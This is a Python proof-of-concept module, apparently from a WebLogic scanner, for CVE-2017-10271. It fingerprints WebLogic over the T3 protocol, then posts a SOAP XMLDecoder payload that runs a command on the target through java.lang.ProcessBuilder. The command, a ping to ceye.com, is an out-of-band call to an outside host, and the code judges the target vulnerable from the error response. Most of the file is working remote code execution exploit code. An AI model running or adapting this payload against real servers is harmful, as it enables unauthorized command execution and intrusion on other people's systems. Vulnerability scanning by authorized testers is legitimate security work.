#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import re, socket
from urllib.parse import urlparse
import time, re
def weblogic_fingerprint(url):          # weblogic版本指纹
    oH = urlparse(url)
    a = oH.netloc.split(':')
    port = 80
    if 2 == len(a):
        port = a[1]
    elif 'https' in oH.scheme:
        port = 443
    host = a[0]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    server_address = (str(host), int(port))
    sock.connect(server_address)
    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
    time.sleep(1)
    try:
        version = (re.findall(r'HELO:(.*?).false', sock.recv(1024).decode()))[0]
        if version:
            return True
        else:
            return False
    except:
        return False

VUL=['CVE-2017-10271']


def poc(u):
    url = "http://" + u
    url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                <void index="0">
                  <string>/usr/sbin/ping</string>
                </void>
                <void index="1">
                  <string>ceye.com</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
        response = response.text
        response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        return True
    else:
        return False


def run(rip,rport):
    url=rip+':'+str(rport)
    return poc(url)
def verify(url):
    relsult = {
        'name': 'CVE_2017_10271(weblogic)',
        'vulnerable': False
    }
    try:
        if weblogic_fingerprint(url) is not True:
            return relsult
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        if run(host, port):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['about'] = 'https://github.com/rabbitmask/WeblogicScan/blob/master/poc/CVE_2017_10271.py'
        return relsult
    except:
        return relsult
